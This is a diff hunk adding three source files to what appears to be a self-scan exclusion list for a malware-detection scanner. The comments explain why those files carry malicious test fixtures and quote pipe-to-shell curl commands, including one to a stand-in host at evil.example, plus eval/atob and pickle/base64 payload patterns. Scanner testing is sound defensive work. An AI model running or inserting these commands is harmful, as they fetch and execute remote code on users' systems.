@@ -168,6 +168,24 @@ cli/src/scanner/context.rs
 cli/src/corpus/engine.rs
 cli/src/corpus/loader.rs
 cli/src/corpus/signing.rs
+# cli/src/corpus/compiled.rs: the compiled-corpus path. Same category as
+# engine.rs above — its parity test (compiled_matches_uncompiled_engine) must
+# feed the engine real malicious strings (os.system('curl … | sh'),
+# eval(atob(…)), pickle.loads(base64.b64decode(…))) to prove the compiled and
+# uncompiled paths agree. Removing those fixtures would remove the guarantee
+# that the optimisation did not change detection behaviour.
+cli/src/corpus/compiled.rs
+# cli/src/scanner/cloud_sigs.rs: cloud-signature engine. Its tests construct
+# signature patterns ("curl") and boundary-case match lines to pin the
+# multi-byte truncation fix and the phase-resolution contract.
+cli/src/scanner/cloud_sigs.rs
+# cli/src/scanner/derive.rs: the derived-analysis-unit module. Its whole
+# purpose is decoding embedded payloads, so its doc comment and tests must
+# contain real ones ("curl http://evil.example/x.sh | sh", base64-encoded and
+# plain) to prove a decoded payload actually reaches the other phases. The
+# scanner also decodes this file's own fixtures and re-reports them, which is
+# the module working correctly on itself.
+cli/src/scanner/derive.rs
 # cli/src/cache.rs and cli/src/ledger.rs: unit tests embed known-risk snippets
 # to prove cache invalidation and trust-ledger suppression do not hide changed
 # artifacts. The production modules remain covered by Rust unit tests.
